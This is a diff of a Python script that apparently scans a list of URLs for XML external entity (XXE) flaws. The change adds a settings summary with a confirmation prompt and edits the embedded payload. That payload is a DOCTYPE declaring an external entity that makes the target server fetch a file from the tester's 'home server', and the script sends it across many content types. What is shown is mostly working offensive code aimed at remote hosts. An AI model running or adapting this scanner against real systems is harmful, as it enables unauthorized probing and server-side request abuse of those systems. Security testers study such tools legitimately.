@@ -20,6 +20,27 @@ else:
 	sys.exit(1)
 
 
+if "https" in target:
+	ip=target.strip("https://")
+else:
+	ip=target.strip("http://")
+
+ip=ip.strip("/")
+
+def show_settings():
+	print("[+] Starting XXE search with below configs\n")
+	print("\t home server: %s"%myserv)
+	print("\t target: %s"%target)
+	print("\t target ip: %s"%ip)
+	print("\t url file: %s"%sys.argv[1])
+	print("\t proxy: %s"%proxy)
+	waiting=input("[?] go? (y/n): ")
+	if waiting.lower()=='n':
+		print("[!] exiting...")
+		sys.exit(1)
+	else:
+		print("[+] Starting....")
+
 def sort_responses(status,url,results_dict):
 	if not url in results_dict.values():
 		results_dict[status].append(url)
@@ -58,23 +79,16 @@ payloads=["""
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "https://%s/BLAHBITTY.txt" >]>
+<!ENTITY xxe SYSTEM "%s/BLAHBITTY.txt" >]>
 <foo>&xxe;</foo>
 """%myserv
 ]
 
+show_settings()
 
-
-
-if "https" in target:
-	ip=target.strip("https://")
-else:
-	ip=target.strip("http://")
-
-ip=ip.strip("/")
 	
 logfile=open('xxeScan_log','w')
-print("[+] Starting ....")
+
 for url in urls.readlines():
 	for ctype in contentTypes:
 		headers={
